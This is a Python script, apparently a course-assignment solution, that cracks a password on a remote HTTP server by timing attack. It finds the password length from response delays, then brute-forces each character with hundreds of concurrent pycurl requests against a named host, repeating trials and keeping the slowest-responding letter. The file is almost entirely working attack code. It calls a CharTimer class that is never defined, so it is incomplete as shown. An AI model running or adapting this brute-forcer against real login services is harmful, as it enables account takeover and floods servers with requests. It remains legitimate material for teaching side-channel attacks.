import urllib.parse
import time
from concurrent.futures import ThreadPoolExecutor
from decimal import Decimal, getcontext
import pycurl
import io
import threading

_thread_local = threading.local()

### -------------------------- ###
### ---- Global Variables ---- ###
### -------------------------- ###
DIFFICULTY = 25

BASE_URL = "aoi-assignment1.oy.ne.ro"
SERVER_PORT = 8080

CHARSET = "abcdefghijklmnopqrstuvwxyz"

USERNAME = "326529229" # need to recieve

# since threads wait for a long long time for I/O
# it is possible and wanted to have a lot of threads
NUMBER_OF_THREADS = 40*DIFFICULTY

PASSWORD = ""
LENGTH = -1

getcontext().prec = 30

### ------------------------- ###
### ----- split_charset ----- ###
### ------------------------- ###
def split_charset():
    """
    this function splits the charset to chars
    """
    parts = [c for c in CHARSET]
    return parts

### ------------------------- ###
### --- get_curl_instance --- ###
### ------------------------- ###
def get_curl_instance():
    """
    Get a persistent curl instance for the current thread.
    This allows for connection reuse and avoids the overhead of creating
    a new curl object for each request.
    each thread will have its own instance of curl client.
    """
    if not hasattr(_thread_local, 'curl'):
        _thread_local.curl = pycurl.Curl()
        # Ensure connection reuse is allowed (default is reuse; explicit for clarity)
        _thread_local.curl.setopt(pycurl.FORBID_REUSE, 0)
        _thread_local.curl.setopt(_thread_local.curl.TIMEOUT, 4)
        _thread_local.curl.setopt(_thread_local.curl.CONNECTTIMEOUT, 5)
    return _thread_local.curl

### ------------------------- ###
### ----- try_password ------ ###
### ------------------------- ###
def try_pass(password):
    global USERNAME, DIFFICULTY, BASE_URL, SERVER_PORT
    params = {'user': USERNAME, 'password': password, 'difficulty': DIFFICULTY}
    query_string = urllib.parse.urlencode(params)
    url = f"http://{BASE_URL}:{SERVER_PORT}/?{query_string}"
    #url = f"http://127.0.0.1/?{query_string}"
    # Get persistent curl instance for this thread.
    c = get_curl_instance()
    buffer = io.BytesIO()
    c.setopt(c.URL, url)
    c.setopt(c.WRITEDATA, buffer)

    num_tries = 5
    success = False
    while num_tries > 0 and not success:
        try:
            c.perform()
            success = True
        except pycurl.error as e:
            errno, errstr = e.args
            num_tries -= 1
            if num_tries == 0:
                # Log the error or handle it as needed
                raise Exception(f"[ERROR] Request timed out after multiple attempts, while trying to check Password: {password}.\nerror: {errstr}")

    total_time_sec = c.getinfo(c.TOTAL_TIME)
    http_code = c.getinfo(c.RESPONSE_CODE)

    # Reset the curl object for reuse in future calls.
    c.reset()

    time_ns = Decimal(total_time_sec) * Decimal(1e9)
    data = int(buffer.getvalue().decode('utf-8')) == 1

    return {"Status": http_code, "Reason": "", "Time": time_ns, "Data": data}


### ----------------------------- ###
### --- crack_password_length --- ###
### ----------------------------- ###
def crack_password_length():
    # to warm up the connection
    try_pass("!")
    maxTime = 0
    length=-1
    for l in range(33):
        result = try_pass("a" * l)
        if(result.get("Time") > maxTime):
            maxTime = result.get("Time")
            length=l
    print(maxTime)
    return length


### ---------------------------- ###
### --- num of repetitions ----- ###
### ---------------------------- ###
def num_repetitions(discovered_length):
    """
    this function returns the number of repetitions needed for each char
    """
    global LENGTH
    # all times 1/internet speed slt
    # remember that discovered_length starts from zero
    return 10*DIFFICULTY*(discovered_length//2+1) + DIFFICULTY*DIFFICULTY*2

### -------------------------- ###
### ---- crack_next_char ----- ###
### -------------------------- ###
def crack_next_char(discovered_length, executor):
    global NUMBER_OF_THREADS
    # to warm up the connection
    try_pass("!")
    r = 1 if LENGTH - discovered_length == 1 else num_repetitions(discovered_length)
    counter = CharTimer()
    parts = split_charset()
    futures = []
    for round in range(r):
        for part in parts:
            futures.append(executor.submit(worker, part, discovered_length, counter))
    # Wait for all threads to complete
    # outside of the loop so that each round wont have to wait on
    # the previous one to finish
    for future in futures:
        future.result()
    return counter.get_max_letter()



def worker(chars, discovered_length, counter):
    global PASSWORD, LENGTH
    if LENGTH - discovered_length == 1:
        for char in chars:
            result = try_pass(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
            if result.get("Data"):
                counter.record_time(char, result.get("Time"))
    else:
        for char in chars:
            result = try_pass(PASSWORD + char + "a" * (LENGTH-discovered_length-1))
            counter.record_time(char, result.get("Time"))




### ------------------------- ###
### ---- main --------------- ###
### ------------------------- ###
def main():
    global PASSWORD, LENGTH
    start = time.perf_counter()

    correct = False
    while not correct:
      # first step - exploit the server's length validation
      LENGTH = crack_password_length()
      print(f"Password length: {LENGTH}")
      # second step - crack the password char by char
      discovered_length = 0
      with ThreadPoolExecutor(max_workers=NUMBER_OF_THREADS) as executor:
          while len(PASSWORD) < LENGTH:
              ch, t = crack_next_char(discovered_length, executor)
              PASSWORD += ch
              discovered_length += 1
              print(f"Password so far: {PASSWORD} char time: {t}")
      correct = try_pass(PASSWORD).get('Data')


    end = time.perf_counter()
    print("-------------------")
    print(try_pass(PASSWORD))
    print(f"total time took: {(end-start)/60} minutes")


if __name__ == '__main__':
    main()
